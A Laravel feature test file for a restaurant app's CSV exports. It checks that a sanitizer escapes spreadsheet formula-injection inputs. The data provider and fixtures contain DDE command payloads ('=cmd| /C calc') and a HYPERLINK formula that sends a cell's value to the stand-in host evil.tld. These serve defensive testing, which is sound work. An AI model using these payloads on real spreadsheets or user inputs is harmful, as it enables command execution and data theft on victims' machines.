<?php

namespace Tests\Feature;

use App\Models\Customer;
use App\Models\Order;
use App\Models\Restaurant;
use App\Support\CsvSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

/**
 * Covers the Phase 3 CSV formula-injection fix.
 *
 * A customer's name and address arrive over WhatsApp and land unmodified in the
 * owner's exported spreadsheet, so a name of `=HYPERLINK(...)` used to execute
 * in the owner's Excel. See App\Support\CsvSanitizer.
 */
class CsvExportTest extends TestCase
{
    use RefreshDatabase;

    private function owner(): Restaurant
    {
        $r = new Restaurant([
            'name'            => 'CSV Test Kitchen',
            'whatsapp_number' => '9232' . random_int(10000000, 99999999),
            'owner_phone'     => '923001234567',
            'is_active'       => true,
            'is_open'         => true,
            'plan'            => 'trial',
        ]);
        $r->owner_password = Hash::make('owner-secret-password');
        $r->save();

        $this->withSession(["restaurant_{$r->id}" => true]);

        return $r;
    }

    /** Drain a streamed response into a string. */
    private function download(string $url): string
    {
        $response = $this->get($url);
        $response->assertOk();

        return $response->streamedContent();
    }

    // ── The sanitizer itself ──────────────────────────────────

    /**
     * @return list<array{0: string, 1: string}>
     */
    public static function formulaProvider(): array
    {
        return [
            'equals'       => ['=1+1', "'=1+1"],
            'plus'         => ['+1+1', "'+1+1"],
            'at'           => ['@SUM(A1:A9)', "'@SUM(A1:A9)"],
            'tab escape'   => ["\t=1+1", "'\t=1+1"],
            'cr escape'    => ["\r=1+1", "'\r=1+1"],
            'dde'          => ['=cmd|\' /C calc\'!A0', "'=cmd|' /C calc'!A0"],
            'hyperlink'    => ['=HYPERLINK("http://evil.tld","x")', "'=HYPERLINK(\"http://evil.tld\",\"x\")"],
            'minus prefix' => ['-2+3+cmd|x', "'-2+3+cmd|x"],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('formulaProvider')]
    public function test_formula_payloads_are_neutralized(string $input, string $expected): void
    {
        $this->assertSame($expected, CsvSanitizer::field($input));
    }

    public function test_ordinary_values_pass_through_untouched(): void
    {
        foreach (['Ali Khan', 'House 4, Street 9', '923001234567', '2026-08-22 14:00:00', 'N/A'] as $value) {
            $this->assertSame($value, CsvSanitizer::field($value));
        }
    }

    public function test_numbers_stay_numeric_so_the_owner_can_still_sum_them(): void
    {
        // A leading `-` on a real number must NOT be quoted, or every refund and
        // money column in the export stops being addable in the spreadsheet.
        $this->assertSame('-250', CsvSanitizer::field('-250'));
        $this->assertSame('1250.5', CsvSanitizer::field(1250.50));
        // Eloquent's decimal cast hands over strings, and the trailing zeros must
        // survive so the column still reads as money.
        $this->assertSame('1250.50', CsvSanitizer::field('1250.50'));
        $this->assertSame('0', CsvSanitizer::field(0));
        $this->assertSame('', CsvSanitizer::field(null));
    }

    // ── End-to-end through the real export routes ─────────────

    public function test_customer_export_neutralizes_a_malicious_name_and_address(): void
    {
        $r = $this->owner();

        Customer::create([
            'restaurant_id' => $r->id,
            'phone'         => '923009999999',
            'name'          => '=HYPERLINK("http://evil.tld?d="&A1,"Refund")',
            'address'       => '@SUM(1+9)*cmd|\' /C calc\'!A0',
            'total_orders'  => 3,
            'total_spent'   => 1500,
        ]);

        $csv = $this->download(route('dashboard.export-customers-csv', $r->id));

        $this->assertStringContainsString('\'=HYPERLINK', $csv);
        $this->assertStringContainsString('\'@SUM', $csv);
        // No cell may begin a formula: `,=` / `,"=` / `,@` etc.
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?[=@\t\r]/m', $csv);
    }

    public function test_sales_report_export_neutralizes_a_malicious_order(): void
    {
        $r = $this->owner();

        Order::create([
            'restaurant_id'    => $r->id,
            'customer_phone'   => '923008888888',
            'customer_name'    => '=cmd|\' /C calc\'!A0',
            'delivery_address' => '+1+1',
            'tracking_code'    => Order::generateTrackingCode($r),
            'status'           => 'delivered',
            'subtotal'         => 900,
            'delivery_charge'  => 100,
            'total'            => 1000,
            'payment_method'   => 'cash_on_delivery',
            'rider_name'       => '@rider',
        ]);

        $csv = $this->download(route('dashboard.export-sales-report-csv', $r->id) . '?period=all');

        $this->assertStringContainsString('\'=cmd', $csv);
        $this->assertStringContainsString('\'+1+1', $csv);
        $this->assertStringContainsString('\'@rider', $csv);
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?[=@\t\r]/m', $csv);

        // The money columns must remain plain numbers.
        $this->assertMatchesRegularExpression('/,900\.00,100\.00,1000\.00,/', $csv);
    }

    public function test_exports_require_authentication(): void
    {
        $r = new Restaurant([
            'name'            => 'Unauthed CSV Kitchen',
            'whatsapp_number' => '9232' . random_int(10000000, 99999999),
            'owner_phone'     => '923001234567',
            'is_active'       => true,
            'plan'            => 'trial',
        ]);
        $r->owner_password = Hash::make('secret');
        $r->save();

        $this->get(route('dashboard.export-customers-csv', $r->id))->assertRedirect();
        $this->get(route('dashboard.export-sales-report-csv', $r->id))->assertRedirect();
    }
}
